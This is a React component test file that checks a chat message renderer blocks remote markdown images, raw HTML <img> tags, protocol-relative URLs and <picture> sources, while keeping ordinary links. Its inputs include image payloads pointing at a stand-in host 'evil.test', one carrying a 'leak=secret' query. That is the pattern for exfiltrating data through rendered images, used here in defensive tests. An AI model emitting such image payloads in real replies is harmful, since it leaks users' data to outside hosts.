import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { MessageResponse } from '../message';

const renderReply = (markdown: string) => render(<MessageResponse>{markdown}</MessageResponse>);

describe('MessageResponse images', () => {
  it('does not load a remote markdown image and says it was blocked', () => {
    const { container } = renderReply('![chart](https://evil.test/p.gif?leak=secret)');
    expect(container.querySelector('img')).toBeNull();
    expect(container).toHaveTextContent('[Image blocked: chart]');
  });

  it('blocks raw HTML images, protocol-relative URLs, and images inside picture', () => {
    const { container } = renderReply(
      '<img src="https://evil.test/a.gif">\n\n![x](//evil.test/b.gif)\n\n<picture><source srcset="https://evil.test/c.gif"><img alt="pic" src="https://evil.test/d.gif"></picture>'
    );
    // A <source> without an <img> is never fetched
    expect(container.querySelector('img')).toBeNull();
  });

  it('keeps links', () => {
    const { container } = renderReply('[docs](https://example.com/docs)');
    expect(container).toHaveTextContent('docs');
  });
});
